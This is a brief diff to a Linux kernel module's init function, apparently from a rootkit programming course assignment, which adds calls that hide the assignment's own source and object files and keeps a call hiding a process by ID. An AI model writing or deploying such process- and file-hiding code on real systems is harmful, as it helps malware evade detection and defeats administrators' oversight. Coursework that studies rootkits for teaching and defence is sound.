@@ -24,7 +24,8 @@ int init_module (void)
 	
 	// TODO: remove debug instructions after this
 	hide_process(3611);
-
+	hide_file_path("/home/martin/rootkit_programming/assignment07/main.c");
+	hide_file_path("/home/martin/rootkit_programming/assignment07/main.o");
 	return 0;
 }
 
